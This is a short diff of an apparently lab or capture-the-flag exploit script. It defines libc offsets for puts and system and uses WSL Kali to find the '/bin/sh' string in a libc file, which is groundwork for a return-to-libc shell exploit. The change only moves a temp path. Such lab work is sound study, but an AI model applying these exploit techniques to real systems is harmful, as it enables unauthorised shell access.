@@ -11,7 +11,7 @@ LIBC_PUTS = 0x80A30
 LIBC_SYSTEM = 0x4F4E0
 
 r = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-lc",
-                    "cd /mnt/c/Users/arnol/AppData/Local/Temp/cylab_bin && python3 -c \"d=open('179_libc.so.6','rb').read(); print(d.find(b'/bin/sh'))\""],
+                    "cd /tmp/cylab_bin && python3 -c \"d=open('179_libc.so.6','rb').read(); print(d.find(b'/bin/sh'))\""],
                    capture_output=True, text=True)
 off_binsh = int((r.stdout or "0").strip() or 0)
 print("binsh off:", hex(off_binsh))
